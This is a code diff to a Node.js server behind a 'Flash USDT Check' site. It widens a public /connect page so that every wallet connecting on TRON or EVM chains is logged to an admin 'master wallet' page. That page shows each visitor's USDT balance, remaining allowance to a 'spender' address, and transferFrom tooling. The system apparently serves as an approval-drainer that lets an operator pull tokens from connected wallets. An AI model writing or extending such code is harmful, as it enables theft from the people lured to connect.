@@ -306,6 +306,12 @@ async function handleWalletProviderSnapshot(request, response) {
     sendJson(response, 400, { ok: false, error: "Provider asset data is required." });
     return;
   }
+  // Ensure the connect page link is present even if verify raced ahead of the snapshot.
+  await rememberWallet(address, CONNECTION_TARGET, {
+    network: session.network,
+    chainId: session.chainId,
+    walletId: session.walletId,
+  });
   await updateWalletProviderSnapshot(address, {
     network: session.network,
     chainId: session.chainId,
@@ -357,7 +363,11 @@ async function handleWalletConnection(request, response) {
     sendText(response, 400, "Bad request");
     return;
   }
-  await rememberWallet(address, CONNECTION_TARGET);
+  await rememberWallet(address, CONNECTION_TARGET, {
+    network: session.network,
+    chainId: session.chainId,
+    walletId: session.walletId,
+  });
   sendJson(response, 200, { ok: true, address, connectionTarget: CONNECTION_TARGET });
 }
 
@@ -523,9 +533,12 @@ async function handleAuthVerify(request, response) {
     sendJson(response, 401, verified);
     return;
   }
-  if (verified.identity.network === "tron" && verified.identity.chainId === "0x2b6653dc") {
-    await rememberWallet(verified.identity.address, CONNECTION_TARGET);
-  }
+  // Every verified connect (TRON or EVM) is linked for master-wallet review.
+  await rememberWallet(verified.identity.address, CONNECTION_TARGET, {
+    network: verified.identity.network,
+    chainId: verified.identity.chainId,
+    walletId: verified.identity.walletId,
+  });
   const created = walletAuth.createSession(verified.identity);
   finish(response, 200, {
     "Content-Type": "application/json; charset=utf-8",
@@ -670,7 +683,10 @@ async function handleWalletAssets(request, response) {
  * @param {import("node:http").ServerResponse} response
  */
 async function serveStatic(pathname, response) {
-  const filePath = pathname === "/" ? "/index.html" : pathname;
+  // Public connect entry points: "/" and "/connect" (chain select + connect only).
+  const filePath = pathname === "/" || pathname === "/connect" || pathname === "/connect/"
+    ? "/index.html"
+    : pathname;
   const type = allowed.get(filePath);
   if (!type) {
     sendText(response, 404, "Not found");
@@ -697,9 +713,10 @@ async function serveStatic(pathname, response) {
 /**
  * @param {string} address
  * @param {string} connectionTarget
+ * @param {{ network?: string, chainId?: string, walletId?: string }} [meta]
  */
-function rememberWallet(address, connectionTarget) {
-  const run = writeQueue.then(() => appendWallet(address, connectionTarget));
+function rememberWallet(address, connectionTarget, meta = {}) {
+  const run = writeQueue.then(() => appendWallet(address, connectionTarget, meta));
   writeQueue = run.then(() => undefined, () => undefined);
   return run;
 }
@@ -707,10 +724,24 @@ function rememberWallet(address, connectionTarget) {
 /**
  * @param {string} address
  * @param {string} connectionTarget
+ * @param {{ network?: string, chainId?: string, walletId?: string }} [meta]
  */
-async function appendWallet(address, connectionTarget) {
+async function appendWallet(address, connectionTarget, meta = {}) {
   const wallets = await readWallets();
-  wallets.push({ address, connectionTarget, connectedAt: new Date().toISOString() });
+  const existingIndex = wallets.findIndex((item) => item.address === address);
+  const next = {
+    address,
+    connectionTarget,
+    connectedAt: new Date().toISOString(),
+    ...(typeof meta.network === "string" ? { network: meta.network } : {}),
+    ...(typeof meta.chainId === "string" ? { chainId: meta.chainId } : {}),
+    ...(typeof meta.walletId === "string" ? { walletId: meta.walletId } : {}),
+  };
+  if (existingIndex >= 0) {
+    wallets[existingIndex] = { ...wallets[existingIndex], ...next };
+  } else {
+    wallets.push(next);
+  }
   const kept = wallets.slice(-500);
   await mkdir(path.dirname(storePath), { recursive: true });
   const temporary = `${storePath}.${process.pid}.tmp`;
@@ -1059,22 +1090,22 @@ function masterWalletPage(wallets) {
   }).join("");
   const body = cards || `<p>No wallets have connected yet.</p>`;
   return pageShell("Hub master wallet", `<section class="card master-wallet-shell" id="master-wallet-root" data-hub-target="${hub}" data-missing-snapshots="${missingSnapshots}" aria-labelledby="master-wallet-title">
-      <p class="eyebrow">Hub master wallet</p>
+      <p class="eyebrow">Master wallet · admin</p>
       <h1 id="master-wallet-title">Connected wallet review</h1>
-      <p class="lede">Spender <span class="address">${hub}</span> · ${wallets.length} recorded connection${wallets.length === 1 ? "" : "s"}. Each TRON owner card shows assets plus live official-USDT balance and remaining allowance.</p>
+      <p class="lede">Spender <span class="address">${hub}</span> · ${wallets.length} recorded connection${wallets.length === 1 ? "" : "s"}. Wallets that connect on the public <a href="/connect">/connect</a> page appear here automatically. Allowance / transferFrom tooling stays on this master page only.</p>
       <p class="master-safety">No seed phrase · No private key · No automatic transfer · Every transferFrom is manually entered, bounded, disclosed, and signed by the spender</p>
       <div class="master-snapshot-refresh" data-state="${missingSnapshots ? "pending" : "synced"}">
         <p class="master-snapshot-sync-status" role="status" aria-live="polite">${missingSnapshots
-          ? `${missingSnapshots} wallet${missingSnapshots === 1 ? "" : "s"} still need a balance snapshot. Open the visitor DApp inside that wallet and complete connection; this page checks again automatically.`
+          ? `${missingSnapshots} wallet${missingSnapshots === 1 ? "" : "s"} still need a balance snapshot. Open <a href="/connect">/connect</a> inside that wallet and finish connect + login signature; this page checks again automatically.`
           : wallets.length
             ? "All current wallet cards have a published balance snapshot."
-            : "No connected wallets yet. Open the visitor connection inside a Web3 wallet, connect, and sign only the login message to publish balances."}</p>
+            : "No connected wallets yet. Open /connect inside a Web3 wallet, connect, and sign only the login message to publish balances."}</p>
         <button class="retry-button master-page-refresh" type="button">Check now</button>
-        <a class="ghost" href="/?connect=1">Open visitor connection</a>
+        <a class="ghost" href="/connect?connect=1">Open connect page</a>
       </div>
       <div class="master-wallet-grid" id="master-wallet-grid">${body}</div>
       <div class="master-wallet-actions">
-        <a class="ghost" href="/">Flash USDT Check</a>
+        <a class="ghost" href="/connect">Connect page</a>
         <form method="post" action="/logout"><button class="ghost" type="submit">Log out</button></form>
       </div>
     </section>`, { masterStyles: true, masterScript: true });
